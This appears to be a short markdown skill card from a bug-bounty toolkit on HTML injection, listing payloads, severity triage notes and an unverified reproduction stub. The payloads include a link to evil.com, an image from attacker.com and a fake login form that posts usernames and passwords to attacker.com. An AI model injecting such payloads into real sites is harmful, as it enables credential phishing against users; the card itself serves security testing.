---
# bughive-repro-start
cve: null
repro: unverified
# bughive-repro-end
---

# SKILL: htmli
## Payloads
<h1>hello</h1>
<a href=http://evil.com>Click here</a>
<img src=http://attacker.com/x.png>
<form action="http://attacker.com" method="post"><input name="u"><input name="p" type="password"><button>Login</button></form>
## Triage
Reflected → Low. Email HTMLi → Med. → CSRF token theft → High.

<!-- bughive-repro-start -->
## Steps to reproduce

> Status: `repro: unverified` — no CVE was resolved for this skill. Nothing below was invented.

### What's missing
- no CVE/target in skill; needs teardown or stays unverified
<!-- bughive-repro-end -->
